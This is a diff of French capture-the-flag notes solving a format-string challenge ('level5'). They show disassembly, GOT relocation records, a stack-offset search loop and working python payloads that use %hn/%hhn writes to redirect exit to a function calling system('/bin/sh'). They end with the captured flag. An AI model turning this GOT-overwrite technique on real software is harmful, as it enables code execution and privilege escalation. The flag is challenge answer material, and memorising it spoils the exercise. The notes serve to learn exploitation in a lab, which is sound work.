@@ -6,35 +6,78 @@ i function
 main => appel n
 
 
-0x080484c2 <+0>:     push   ebp
-   0x080484c3 <+1>:     mov    ebp,esp
-   0x080484c5 <+3>:     sub    esp,0x218
-   0x080484cb <+9>:     mov    eax,ds:0x8049848
-   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
-   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
-   0x080484dc <+26>:    lea    eax,[ebp-0x208]
-   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
-   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
-   0x080484ea <+40>:    lea    eax,[ebp-0x208]
-   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
-   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
-   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
-   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
-
-
 Comme exercies précédents, dans n : appel à fgets et printf de la chaine de char (buffer taille 512)
 
-
-Dump of assembler code for function o:
-   0x080484a4 <+0>:     push   ebp
-   0x080484a5 <+1>:     mov    ebp,esp
-   0x080484a7 <+3>:     sub    esp,0x18
-   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
-   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
-   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
-   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+dans 'o' à l'adresse 0x080484b1, appel systeme avec "/bin/sh"
 
 
-dans 'o' à l'adresse 0x080484b1, appel system avec /bin/sh"
+objdump -R level5
 
-Utilisation de printf pour exécuter le system à l'adrese 0x080484b1 ?
+=> 
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+
+08049838 => exit
+
+si on parvient à remplacer l'adresse de cette fonction au moment où elle est appelée par l'adresse de la fonction o (0x080484a4), on devrait parvenir à ouvrir le terminal avec le user level6
+
+Il faut donc écrire "0x080484a4" à l'adresse 0x08049838 pour remplacer la VALUE déjà présente (exit)
+
+
+Offset stack =>
+
+ for((i=0;i<100;i++));do echo -n "Index $i :" && echo -n ' ' && echo "BBBB%$i\$x" | ./level5 ;  done | grep "42424242"
+ =>
+ Index 4 : BBBB42424242
+
+On peut écrire chaque octet un par un :
+
+0x08049838 : 0xa4 (164 base 10)
+0x08049839 : 0x84 (132 base 10)
+0x0804983a : 0x0804 (2052 base 10)
+
+On doit replacer les adresses dans l'ordre (quantité chars augmente) :
+
+0x08049839 : 0x00000084 (132 base 10)
+0x08049838 : 0x000000a4 (164 base 10)
+0x0804983a : 0x00000804 (2052 base 10)
+
+  python -c "print (adresse1 + adresse 2 + adresse 3 + 'x' * X + '%4\$n' + 'x' * X + '%5\$n'  + 'x' * X + '%6\$n')" | ./level5
+                    4 octets + 4 octets  + 4 octets +    ?    =    132     +      ?   =   164     +     ?   =  2052
+                    _______________________________
+                               12 octets            +    120   =    132     +    32    =   164     +   1888    = 2052
+
+   => on ajoute le modifier puisqu'on ne souhaite écrire seulement 1 octet de l'adresse ($n => $hhn)
+
+   %n   -- writes four bytes
+   %hn  -- writes two bytes
+   %hhn -- writes one byte
+
+
+ (python -c "print ('\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + 'x' * 120 + '%4\$hhn' + 'x' * 32 + '%5\$hhn'  + 'x' * 1888 + '%6\$hn')"; cat ) | ./level5
+
+ Comme les adresses __ et __ commencent pareil, on peut se contenter d'écrire uniquement les deux derniers octets =>  (python -c "print ('\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] + 'x' * 124 + '%4\$hhn' + 'x' * 32 + '%5\$hhn')"; cat ) | ./level5
+
+ 
+Méthode plus courte en réécrivant seulement les 2 derniers octets (adresses plus faibles 38 et 39): 33954 (=0x84A4)
+
+
+(python -c "print ('\x08\x04\x98\x39'[::-1] + '%33952d' + '%4\$hn')"; cat -) | ./level5
+                              4             +   0x84A0   = 0x84A4
+                                                            39-38
+
+   
+
+
+flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
